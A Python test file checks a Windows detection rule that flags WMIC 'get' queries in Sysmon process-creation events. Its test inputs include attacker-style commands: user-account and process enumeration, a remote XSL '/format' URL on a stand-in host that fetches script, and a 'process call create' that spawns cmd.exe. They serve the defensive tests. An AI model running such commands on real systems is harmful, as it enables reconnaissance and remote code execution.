from __future__ import annotations

from pathlib import Path

from breachscope.analyzer import apply_rules
from breachscope.rules import load_rules
from breachscope.schemas import Event


RULE_ID = "R-WMI-QUERY-GET"


def _rule():
    by_id = {rule.id: rule for rule in load_rules(Path("rules"))}
    return by_id[RULE_ID]


def _event(
    *,
    image: str = r"C:\Windows\System32\wbem\WMIC.exe",
    command_line: str,
    source: str = "Microsoft-Windows-Sysmon",
    event_id: str = "1",
) -> Event:
    return Event(
        timestamp="2026-01-01T00:00:00Z",
        host="TESTHOST",
        source=source,
        event_id=event_id,
        user=r"TESTHOST\operator",
        command_line=command_line,
        raw={"Image": image},
    )


def _ids(event: Event) -> set[str]:
    return {finding.rule_id for finding in apply_rules([event], [_rule()])}


def test_atomic_useraccount_query_matches() -> None:
    assert _ids(_event(command_line="wmic useraccount get /ALL /format:csv")) == {RULE_ID}


def test_atomic_process_query_matches() -> None:
    cmd = "wmic process get caption,executablepath,commandline /format:csv"
    assert _ids(_event(command_line=cmd)) == {RULE_ID}


def test_other_wmic_get_query_is_not_atomic_specific() -> None:
    assert _ids(_event(command_line="wmic os get Caption,Version")) == {RULE_ID}


def test_case_variation_matches() -> None:
    assert _ids(_event(command_line="WMIC SERVICE GET Name,State")) == {RULE_ID}


def test_remote_xsl_format_url_is_excluded() -> None:
    cmd = 'wmic os get Caption /format:"http://example.invalid/query.xsl"'
    assert _ids(_event(command_line=cmd)) == set()


def test_remote_https_xsl_format_url_is_excluded_with_spacing() -> None:
    cmd = "wmic process get Name /format : https://example.invalid/query.xsl"
    assert _ids(_event(command_line=cmd)) == set()


def test_wmi_process_creation_is_not_query_telemetry() -> None:
    cmd = 'wmic process call create "cmd.exe /c whoami"'
    assert _ids(_event(command_line=cmd)) == set()


def test_get_substring_is_not_a_get_verb() -> None:
    assert _ids(_event(command_line="wmic path Win32_Widget call Refresh")) == set()


def test_non_wmic_image_is_excluded() -> None:
    assert _ids(_event(image=r"C:\Windows\System32\cmd.exe", command_line="wmic os get Caption")) == set()


def test_wrong_provider_is_excluded() -> None:
    assert _ids(_event(command_line="wmic os get Caption", source="Microsoft-Windows-Security-Auditing")) == set()


def test_wrong_event_id_is_excluded() -> None:
    assert _ids(_event(command_line="wmic os get Caption", event_id="13")) == set()


def test_rule_metadata_is_low_confidence_generic_t1047_telemetry() -> None:
    rule = _rule()
    assert rule.mitre_technique == "T1047"
    assert rule.severity == "low"
    text = " ".join([rule.id, rule.name, rule.description, rule.pattern, str(rule.all_of)]).lower()
    assert "useraccount" not in text
    assert "process get" not in text
    assert "atomic" not in text
    assert "admin_test" not in text
